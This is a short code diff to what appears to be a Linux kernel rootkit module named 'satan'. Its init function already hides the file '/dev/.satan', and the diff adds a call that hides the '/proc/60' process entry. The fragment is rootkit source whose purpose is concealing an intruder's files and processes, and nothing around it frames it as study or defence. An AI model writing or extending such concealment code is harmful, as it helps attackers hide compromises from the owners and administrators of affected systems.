@@ -18,6 +18,7 @@ static int __init satan_init(void)
         satan_file_init();
 
         satan_file_hide("/dev/.satan");
+        satan_file_hide("/proc/60");
 
         return 0;
 }
